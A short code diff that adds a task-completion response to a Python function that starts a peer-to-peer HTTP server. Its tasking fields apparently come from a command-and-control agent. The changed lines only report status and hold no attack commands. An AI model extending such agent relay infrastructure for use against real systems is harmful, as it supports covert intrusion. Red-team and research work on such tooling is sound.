@@ -103,5 +103,12 @@ def p2p_server(task_id):
         thread = threading.Thread(target = httpd.serve_forever, daemon=True)
         thread.start()
 
+        response = {
+            'task_id': task_id,
+            "user_output": "P2P Server started on {}:{}".format(getIP(), p2p_port),
+            'completed': True
+        }
+        responses.append(response)
         print("\t- P2P Server started on {}:{}".format(getIP(), p2p_port))
+        
     run()
